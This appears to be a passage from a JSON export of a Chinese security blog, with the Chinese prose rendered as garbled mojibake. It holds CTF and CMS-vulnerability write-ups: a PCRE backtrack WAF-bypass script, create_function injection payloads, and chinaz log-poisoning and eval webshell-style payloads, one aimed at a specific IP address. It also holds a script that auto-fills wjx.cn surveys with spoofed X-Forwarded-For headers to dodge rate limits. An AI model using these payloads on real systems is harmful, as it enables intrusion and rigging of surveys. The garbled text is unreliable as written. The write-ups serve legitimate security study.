io import BytesIOfiles = &#123; &apos;file&apos;: BytesIO(b&apos;aaa&lt;?php phpinfo();//&apos; + b&apos;a&apos; * 1000000)&#125;res = requests.post(&apos;http://127.0.0.1/codebreaking/easy-pcrewaf/&apos;, files=files, allow_redirects=False)print(res.headers) è®¿é—®/data/f528764d624db129b32c21fbca0cb8d6å³å¯ï¼Œå…¶ä¸­data/åé¢æ˜¯md5(â€˜â€™) pç¥è¿˜æåˆ°äº†å¦ä¸€ç§æ›´å¸¸è§çš„waf 1234&lt;?phpif(preg_match(&apos;/UNION.+?SELECT/is&apos;, $input)) &#123; die(&apos;SQL Injection&apos;);&#125; è¿™é‡Œæ¶‰åŠåˆ°äº†æ­£åˆ™è¡¨è¾¾å¼çš„â€œéè´ªå©ªæ¨¡å¼â€ã€‚å…·ä½“å‚è€ƒpç¥çš„é“¾æ¥ å›æº¯æ¬¡æ•°éšç€açš„æ•°é‡å¢åŠ è€Œå¢åŠ ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥é€šè¿‡å‘é€å¤§é‡aï¼Œæ¥ä½¿å›æº¯æ¬¡æ•°è¶…å‡ºpcre.backtrack_limité™åˆ¶ï¼Œè¿›è€Œç»•è¿‡WAF ä¿®å¤ä¹Ÿå¾ˆç®€å•ï¼šç”¨preg_matchå¯¹å­—ç¬¦ä¸²è¿›è¡ŒåŒ¹é…ï¼Œä¸€å®šè¦ä½¿ç”¨===å…¨ç­‰å·æ¥åˆ¤æ–­è¿”å›å€¼ï¼Œ å‚è€ƒé“¾æ¥ï¼šhttps://paper.seebug.org/755/ https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html https://regex101.com","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"codebreaking-1","slug":"codebreaking-1","date":"2019-08-14T02:20:02.000Z","updated":"2019-08-22T13:47:04.004Z","comments":true,"path":"2019/08/14/codebreaking-1/","link":"","permalink":"http://yoursite.com/2019/08/14/codebreaking-1/","excerpt":"chrome+phpstormçš„è°ƒè¯•é—®é¢˜çœŸæ˜¯é†‰äº†ï¼Œæƒ³èµ·ä¹‹å‰çœ‹åˆ°åŒå­¦åœ¨åˆ·code breakingï¼Œæ­£å¥½å¯ä»¥çœ‹çœ‹é‚£ä¸ªğŸ˜€ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"chrome+phpstormçš„è°ƒè¯•é—®é¢˜çœŸæ˜¯é†‰äº†ï¼Œæƒ³èµ·ä¹‹å‰çœ‹åˆ°åŒå­¦åœ¨åˆ·code breakingï¼Œæ­£å¥½å¯ä»¥çœ‹çœ‹é‚£ä¸ªğŸ˜€ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; easy - function12345678&lt;?php $action = $_GET[&apos;action&apos;] ?? &apos;&apos;; $arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;; if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__); &#125; else &#123; $action(&apos;&apos;, $arg);&#125; $a ?? 0 ç­‰åŒäº isset($a) ? $a : 0 preg_match()è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸ºpreg_match()åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚è¦æƒ³åŠæ³•ç»•è¿‡æ­£åˆ™ï¼Œ ^ åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ï¼Œåœ¨å¤šè¡Œæ¨¡å¼ä¸­åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´$ åŒ¹é…å­—ç¬¦ä¸²æœ«å°¾ï¼Œåœ¨å¤šè¡Œæ¨¡å¼ä¸­åŒ¹é…æ¯ä¸€è¡Œçš„æœ«å°¾ æ¨¡å¼åˆ†éš”ç¬¦åçš„â€iâ€æ ‡è®°è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„æœç´¢ æ¨¡å¼åˆ†éš”ç¬¦åçš„â€sâ€æ ‡è®°æ¨¡å¼ä¸­çš„ç‚¹å·å…ƒå­—ç¬¦åŒ¹é…æ‰€æœ‰å­—ç¬¦, åŒ…å«æ¢è¡Œç¬¦ æ¨¡å¼åˆ†éš”ç¬¦åçš„â€Dâ€æ ‡è®°æ¨¡å¼ä¸­çš„å…ƒå­—ç¬¦ç¾å…ƒç¬¦å·ä»…ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ«å°¾. æ­£åˆ™å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯è¦æƒ³åŠæ³•åœ¨å‡½æ•°åçš„å¤´æˆ–è€…å°¾æ‰¾ä¸€ä¸ªå­—ç¬¦ï¼Œä¸å½±å“å‡½æ•°è°ƒç”¨ã€‚ æ€ä¹ˆæ‰¾å‘¢ï¼Œfuzzå¤§æ³•å¥½ å½“ç„¶fuzzä¹Ÿæœ‰æŠ€å·§ï¼Œæœ‰æ—¶å€™å¯ä»¥å…ˆè‡ªå·±å†™ä¸ªè„šæœ¬fuzz.php è¿™é‡Œä¸éœ€è¦ä¿®æ”¹è„šæœ¬ï¼Œåªéœ€è¦åœ¨ä¼ å€¼çš„æ—¶å€™åœ¨fuzzååŠ ä¸Šä¸€ä¸ªæ­£å¸¸çš„å‡½æ•°åï¼Œæˆ‘ç”¨äº†var_dumpï¼Œç¬¬ä¸€æ¬¡ç”¨äº†echoä¼šæŠ¥é”™ (â—‹Â´ï½¥Ğ´ï½¥)ï¾‰ å‘ç°#æ˜¯400é”™è¯¯ï¼Œ\\æ­£å¸¸æ˜¾ç¤ºï¼ŒåŸç†å¯ä»¥å‚è€ƒç»™å‡ºçš„é“¾æ¥ ç„¶åæ˜¯æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨create_function()æ¥å®Œæˆ å‡½æ•°ç»“æ„ 1234567create_function(&apos;$a,$b&apos;,&apos;return 111&apos;)==&gt; function a($a,$b)&#123; return 111;&#125; æˆ‘ä»¬æƒ³è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œé¦–å…ˆéœ€è¦è·³å‡ºå‡½æ•°å®šä¹‰ 1234567create_function(&apos;$a,$b&apos;,&apos;return 111;&#125;phpinfo();//&apos;)==&gt;function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; å¾ˆå¥‡æ€ªçš„æ˜¯ç›´æ¥æ‰§è¡Œä¸‹é¢çš„ä¼šæŠ¥é”™ï¼Œè€Œä¸”ä¸èƒ½æŠŠ//å»æ‰ 123function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; æ‰€ä»¥æœ€åçš„payloadï¼š ?action=\\create_function&amp;arg=}phpinfo();// ========================================================================== ç„¶åè”æƒ³åˆ°ä¹‹å‰jactfé‡åˆ°çš„å˜å½¢é¢˜ 12345678910111213141516&lt;?php if(isset($_GET[&apos;action&apos;])) &#123; $action = $_GET[&apos;action&apos;]; &#125; if(isset($_GET[&apos;action&apos;]))&#123; $arg = $_GET[&apos;arg&apos;]; &#125; if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action))&#123; echo &quot;2&quot;; show_source(__FILE__); &#125; else &#123; $action($arg,&apos;&apos;); &#125; ç›´æ¥æ„é€ payloadï¼š ?action=\\create_function&amp;arg=){}phpinfo();// å‚è€ƒé“¾æ¥ï¼šhttps://paper.seebug.org/755/ phpstormçš„è°ƒè¯•é—®é¢˜çœŸæ˜¯é†‰äº†ï¼Œæƒ³èµ·ä¹‹å‰çœ‹åˆ°åŒå­¦åœ¨åˆ·","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","slug":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","date":"2019-08-13T04:57:44.000Z","updated":"2019-08-22T13:47:10.099Z","comments":true,"path":"2019/08/13/chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´/","link":"","permalink":"http://yoursite.com/2019/08/13/chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´/","excerpt":"Xmanå›æ¥çš„ç¬¬2å¤©ï¼ŒæŠŠåˆ˜å“¥å‘çš„åŒ—äº¬è¥çš„pptçœ‹äº†ä¸‹ï¼Œå¤ç°äº†chinazçš„ä¸‰ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä»¥å‰éƒ½æ˜¯ç›²ç›®åˆ·é¢˜ï¼Œé¢˜ç›®è´¨é‡å±‚æ¬¡ä¸é½ï¼Œå¯¹å¾ˆå¤šåŸç†ä¹Ÿæ˜¯ä¸€çŸ¥åŠè§£ï¼Œåœ¨Xmançš„æ—¶å€™å’Œå¼ åŠ›å¤§ä½¬èŠäº†è®¸å¤šï¼Œä»¥åè¦å¤šå¤ç°CMSã€‚ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"Xmanå›æ¥çš„ç¬¬2å¤©ï¼ŒæŠŠåˆ˜å“¥å‘çš„åŒ—äº¬è¥çš„pptçœ‹äº†ä¸‹ï¼Œå¤ç°äº†chinazçš„ä¸‰ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä»¥å‰éƒ½æ˜¯ç›²ç›®åˆ·é¢˜ï¼Œé¢˜ç›®è´¨é‡å±‚æ¬¡ä¸é½ï¼Œå¯¹å¾ˆå¤šåŸç†ä¹Ÿæ˜¯ä¸€çŸ¥åŠè§£ï¼Œåœ¨Xmançš„æ—¶å€™å’Œå¼ åŠ›å¤§ä½¬èŠäº†è®¸å¤šï¼Œä»¥åè¦å¤šå¤ç°CMSã€‚ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 1ã€index.php1234567891011121314&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $view_class = new View(); $data = array(); if (isset($_GET[&apos;page&apos;])) &#123; $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]); &#125; else&#123; $data[&apos;page&apos;] = &apos;js&apos;; &#125; $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; indexé¡µé¢é€šè¿‡pageå‚æ•°è°ƒç”¨ä¸åŒåŠŸèƒ½çš„phpé¡µé¢ 2ã€action.php12345678910&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;; $post_data = array(); foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value; &#125; @require_once($page);?&gt; å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å­˜åœ¨åç¼€.phpï¼Œè¿‡æ»¤ä¸»è¦æ˜¯filterï¼Œ å…¨å±€æœç´¢ 12345&gt; function filter($input)&gt; &#123;&gt; return str_replace(&apos;.&apos;, &apos;&apos;, $input);&gt; &#125;&gt; å°† . è¿‡æ»¤æˆç©ºï¼Œæ–‡ä»¶åŒ…å«è·¯å¾„ä¸­ä¸èƒ½æœ‰ . å¯¼è‡´æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„è¿›è¡ŒåŒ…å«ã€‚ å¯ä»¥åŒ…å«å¸¸è§é‡è¦æ–‡ä»¶æˆ–æ—¥å¿—æ–‡ä»¶ 3ã€common.php12345function write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 123456789101112function loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&apos;Try to open Null file:&apos;.$filePath); return file_get_contents($cfg_basedir.&apos;/error.php&apos;); &#125; $fp = @fopen($filePath,&apos;r&apos;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 1$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;; å½“è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢æ—¶ï¼Œå†™å…¥å†…å®¹åˆ°logs/logfile.phpä¸­ 4ã€æ¼æ´ä¸€æ”»å‡»å¤ç°æ„é€ payloadï¼š http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E è®¿é—®ï¼š http://59.110.164.44:8238/logs/logfile.php å¦‚æœæ²¡æœ‰ç›´æ¥è®¿é—®æƒé™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨action.phpä¸­çš„æ–‡ä»¶åŒ…å«ï¼Œ å¹¶ä¸”å¯ä»¥çœ‹åˆ°phpinfoä¸­ï¼Œå› æ­¤æ— æ³•è¿œç¨‹æ–‡ä»¶åŒ…å« allow_url_fopen On On allow_url_include Off Off 5ã€normaliz.php12345678910try&#123; if ($method == &apos;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&apos;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; preg_replaceçš„æ­£åˆ™å¦‚æœåŠ äº†eè¿™ä¸ªé€‰é¡¹ï¼Œä¼šæŠŠæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢çš„éƒ¨åˆ†æ›¿æ¢ä¹‹åçš„å†…å®¹æ‰§è¡Œä¸€ä¸‹ï¼Œç„¶åå°†æ‰§è¡Œå®Œçš„ç»“æœæ”¾å…¥éœ€è¦è¢«æ›¿æ¢çš„ä½ç½® method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a; preg_replace(â€œ/a/eâ€,â€phpinfo()â€,â€aâ€); ä½†æ˜¯php 7.0.0å¼€å§‹ï¼Œä¸å†æ”¯æŒ/eä¿®é¥°ç¬¦ï¼Œè¯·ç”¨preg_replace_callback()ä»£æ›¿ è€Œä¸”ä»å‰é¢çš„phpinfoå¾—çŸ¥æˆ‘ä»¬çš„PHPç‰ˆæœ¬æ˜¯7.3.4ğŸ¤¦â€ 6ã€å…ˆè§£å†³å˜é‡è¦†ç›–é—®é¢˜1234567$view_class = new View();$data = array();$data[&apos;page&apos;] = &apos;normaliz&apos;;$ip_replacement = &apos;222.222.222.222&apos;;$mail_replacement = &apos;lollol@lol.com&apos;;$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&apos;page&apos;], $data); é™¤äº†$post_dataï¼Œå…¶ä»–å€¼éƒ½æ˜¯å†™æ­»çš„ï¼Œå¦‚ä½•æ§åˆ¶ é€šè¿‡action.phpçš„æ–‡ä»¶åŒ…å«ï¼Œè¿›è¡Œå˜é‡è¦†ç›–æ§åˆ¶ 1234$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125; + normaliz.php 1234function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; 7ã€æ¼æ´äºŒæ”»å‡»å¤ç°åœ¨æœ¬åœ°å°†phpåˆ‡æ¢ä¸ºphp5.4æ„é€ payload: http://127.0.0.1/chinaz/ postï¼š page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a 8ã€view.php1@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); å’Œå…¸å‹çš„æµ·æ´‹cmsæ¼æ´å·®ä¸å¤š 1234&lt;?php $strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;; var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;)); ç»“æœï¼š 1234567string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;phpinfo()PHP Version =&gt; 7.3.4System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64............ 9ã€å¯»æ‰¾æ”»å‡»ç‚¹123456789101112131415161718192021&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); function action($post_data)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; if ($method===&apos;md5&apos;)&#123; $res = md5($source); &#125; if ($method===&apos;sha1&apos;)&#123; $res = sha1($source); &#125; return $res; &#125; $view_class = new View(); $data = array(); $data[&apos;page&apos;] = &apos;md5&apos;; $data[&apos;res&apos;] = action($post_data); $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; md5æ–‡ä»¶åŒ…å«äº†view.phpï¼Œä¸”æœ‰å˜é‡è¦†ç›–ç‚¹ï¼Œreså¯æ§åˆ¶$strif è¯æ˜¯è¿™ä¹ˆè¯´ï¼Œä½†æ˜¯çœ‹äº†åŠå¤©ä¹Ÿçœ‹ä¸æ‡‚resæ˜¯æ€ä¹ˆæ§åˆ¶$strIfçš„ï¼Œå¤ªå¤šå¤„ç†å‡½æ•°ï¼Œæœ€è®¨åŒçš„ä¸€ç‚¹æ˜¯æˆ‘æ¯æ¬¡firefox+burp+phpstormè°ƒè¯•ä¸€ä¼šå°±ä¼šæ–­æ‰ã€‚ã€‚ã€‚ä¸çŸ¥é“ä¸ºå•¥ğŸ˜­ 10ã€æ¼æ´ä¸‰å¤ç°æ„é€ payloadï¼š http://127.0.0.1/chinaz/action.php postï¼špage=md5&amp;res=â€or @eval($_POST[adddd]) or â€œ&amp;adddd=phpinfo(); è¿™é‡Œçš„postçš„å€¼éœ€è¦bpæŠ“åŒ…ä¿®æ”¹ï¼Œå› ä¸ºhackbarç›´æ¥ä¼ å€¼resä¼šå˜æˆâ€â€ è·Ÿç€pdfé‡Œé¢çš„æµç¨‹èµ°äº†ä¸€éï¼Œé™¤äº†ç¬¬ä¸‰ä¸ªå…·ä½“ç»†èŠ‚ä¸æ˜¯å¾ˆæ‡‚ï¼Œç­‰ä¸‹æ¬¡å¤ç°æµ·æ´‹CMSçš„æ—¶å€™å†å›å¤´çœ‹çœ‹æŠŠï¼Œè¿˜æœ‰å¸Œæœ›æœ‰äººå¸®æˆ‘è§£å†³æˆ‘çš„è°ƒè¯•é—®é¢˜ã€‚","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"},{"name":"å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ","permalink":"http://yoursite.com/tags/å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ/"}]},{"title":"çˆ¬è™«å…¥é—¨","slug":"çˆ¬è™«å…¥é—¨","date":"2019-07-25T05:20:39.000Z","updated":"2019-08-22T13:47:31.156Z","comments":true,"path":"2019/07/25/çˆ¬è™«å…¥é—¨/","link":"","permalink":"http://yoursite.com/2019/07/25/çˆ¬è™«å…¥é—¨/","excerpt":"åœ¨è½¯ä»¶åˆ›æ–°å®éªŒå®¤æš‘æœŸé›†è®­çš„æ—¶å€™ï¼Œå¶åŒå­¦è®²äº†çˆ¬è™«ï¼Œè¿™é‡Œç®€å•æŠŠä¸¤ç§çˆ¬è™«åº”ç”¨è®°å½•ä¸‹ã€‚è¿˜æœ‰ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦çˆ¬è™«æ˜¯é€šè¿‡å¼ å®ä¼¦çš„ã€Šå…¨æ ˆæ•°æ®å·¥ç¨‹å¸ˆã€‹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;","text":"åœ¨è½¯ä»¶åˆ›æ–°å®éªŒå®¤æš‘æœŸé›†è®­çš„æ—¶å€™ï¼Œå¶åŒå­¦è®²äº†çˆ¬è™«ï¼Œè¿™é‡Œç®€å•æŠŠä¸¤ç§çˆ¬è™«åº”ç”¨è®°å½•ä¸‹ã€‚è¿˜æœ‰ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦çˆ¬è™«æ˜¯é€šè¿‡å¼ å®ä¼¦çš„ã€Šå…¨æ ˆæ•°æ®å·¥ç¨‹å¸ˆã€‹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹ 1&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; 1ã€çˆ¬å–æŸç½‘ç«™çš„æ‹›è˜ä¿¡æ¯1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport reimport timeimport jsonimport csvfrom bs4 import BeautifulSoupheaders = &#123; &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&quot;&#125;s = requests.session()f = open(&quot;data.json&quot;, &quot;a&quot;, encoding=&apos;utf-8&apos;)def get_one_page(url): try: r = requests.get(url, headers=headers) r.encoding = r.apparent_encoding return r.text except: return &quot;çˆ¬å–å¤±è´¥&quot;import pandas as pddef parse_page3(res): html = BeautifulSoup(res, &quot;html.parser&quot;) # print(res) result = [] place = html.select(&quot;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.address&quot;) job = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.name&apos;) salary = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; p&apos;) company = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_comp &gt; div &gt; a&apos;) welfare = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_wel.clearfix&apos;) for place, job, salary, company, welfare in zip(place, job, salary, company, welfare): result.append(&#123; &quot;place&quot;: place.get_text(), &quot;job&quot;: job.get_text(), &quot;salary&quot;: salary.get_text(), &quot;company&quot;: company.get_text(), &quot;welfare&quot;: welfare.get_text() &#125;) # å‚¨å­˜ä¸ºjsonæ–‡ä»¶ f.write(json.dumps(result, indent=2, ensure_ascii=False)) # å‚¨å­˜ä¸ºcsvæ–‡ä»¶(pandas) df = pd.DataFrame(result) df.to_csv(&apos;data2.csv&apos;, index=False, sep=&apos;,&apos;, mode=&apos;a&apos;) # å‚¨å­˜ä¸ºexcelæ–‡ä»¶ df = pd.DataFrame(result) df.to_csv(&apos;data3.xls&apos;, index=False, sep=&apos; &apos;, mode=&apos;a&apos;, encoding=&apos;utf-8_sig&apos;) return resultdef main(offset): url = &quot;https://hz.58.com/ywtzjingli/pn&quot; + str( offset) + &quot;/?classpolicy=main_null,job_A&amp;final=1&amp;jump=1&amp;PGTID=0d35f8c7-0004-f4fa-d607-70e9d941aa91&amp;ClickID=2&quot; html = get_one_page(url) result = parse_page3(html) # print(result) # tmp1 = [] # for dic in result: # print(dic) # tmp = [] # tmp.append(dic[&apos;place&apos;]) # tmp.append(dic[&apos;job&apos;]) # tmp.append(dic[&apos;salary&apos;]) # tmp.append(dic[&apos;company&apos;]) # tmp.append(dic[&apos;welfare&apos;]) # print(tmp) # tmp1.append(tmp)if __name__ == &apos;__main__&apos;: for i in range(1, 4): main(i) time.sleep(1) 2ã€è‡ªåŠ¨å¡«å†™é—®å·123456789101112131415161718192021222324252627282930313233import timefrom random import randintimport requestsurl = &quot;https://www.wjx.cn/joinnew/processjq.ashx?submittype=1&amp;curID=43819938&amp;t=1565166732242&amp;starttime=2019%2F8%2F7%2016%3A32%3A09&amp;ktimes=26&amp;rn=606189091.36417905&amp;hlv=1&amp;jqnonce=b636e088-5337-4ff5-973b-4ac2fd8b59ee&amp;jqsign=d050c6%3E%3E%2B3551%2B2%60%603%2B%3F15d%2B2ge4%60b%3Ed3%3Fcc&amp;jpm=17&quot;for i in range(1,10): header = &#123; &apos;Host&apos;:&apos;www.wjx.cn&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&apos;, &apos;Accept&apos;: &apos;* / *&apos;, &apos;Accept - Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Accept - Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Referer&apos;: &apos;https://www.wjx.cn/jq/43819938.aspx&apos;, &apos;Content-Length&apos;: &apos;32&apos;, &apos;x-forwarded-for&apos;:str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255)), &apos;Cookie&apos;: &apos;acw_tc=2f624a2a15651667032113449e5a5a78c559be33a29f05393240f389ae1f26; .ASPXANONYMOUS=xwlWYYyD1QEkAAAANGQyY2UwY2QtNmMwMi00YzdjLTkyNjgtYjAwOTJjYzJlZWJhKVHVbWcXUrju0Qwec7aNRZwVtj81; jac43819938=36417905; UM_distinctid=16c6b348da41e1-011e2866b35c748-4c312272-144000-16c6b348da529f; CNZZDATA4478442=cnzz_eid%3D1762370884-1565166375-%26ntime%3D1565166375; Hm_lvt_21be24c80829bd7a683b2c536fcf520b=1565166702; Hm_lpvt_21be24c80829bd7a683b2c536fcf520b=1565166729; jpckey=%u5B66%u5386; LastActivityJoin=43819938,103045812444&apos;, &apos;Connection&apos;: &apos;close&apos; &#125; print(&apos;Using ip:&apos;+header[&apos;x-forwarded-for&apos;]) #submitdata = &quot;1$%s&#125;2$%s&#125;3$%s&quot; % (str(randint(1, 2)), str(randint(1, 4)), str(randint(1, 4))) # data = &#123; # &apos;submitdata&apos;:submitdata # &#125; data = &quot;submitdata=1%24&quot;+str(randint(1,2))+&quot;%7D2%24&quot;+str(randint(1,4))+&quot;%7D3%24&quot;+str(randint(1,4)) print data r = requests.post(url,headers=header,data=data) print r.headers print r.content time.sleep(40) headersä»bpæŠ“çš„åŒ…å¤åˆ¶å³å¯ ç»•è¿‡æ–¹æ³•ï¼šä½¿ç”¨xffã€è®¾ç½®è„šæœ¬å‘åŒ…çš„æ—¶é—´é—´éš” ç›®å‰è„šæœ¬å¾ˆå¤§æ¦‚ç‡ä¼šå‡ºç°å›½å¤–ipï¼Œå¯ä»¥æœé›†å›½å†…ip å‚è€ƒé“¾æ¥ï¼šhttps://mochazz.github.io/","categories":[],"tags":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/tags/çˆ¬è™«/"}]},{"title":"Start","slug":"start","date":"2019-07-18T03:48:34.000Z","updated":"2019-07-18T11:16:12.822Z","comments":true,"path":"2019/07/18/start/","link":"","permalink":"http://yoursite.com/2019/07/18/start/","excerpt":"","text":"Skr è¿™æ¬¡å¤©buuctfåšåˆ°è‡ªé—­ï¼Œçœ‹æ¢ä¸ªåšå®¢èƒ½ä¸èƒ½æ¢ä¸ªå¿ƒæƒ…:)","categories":[],"tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]}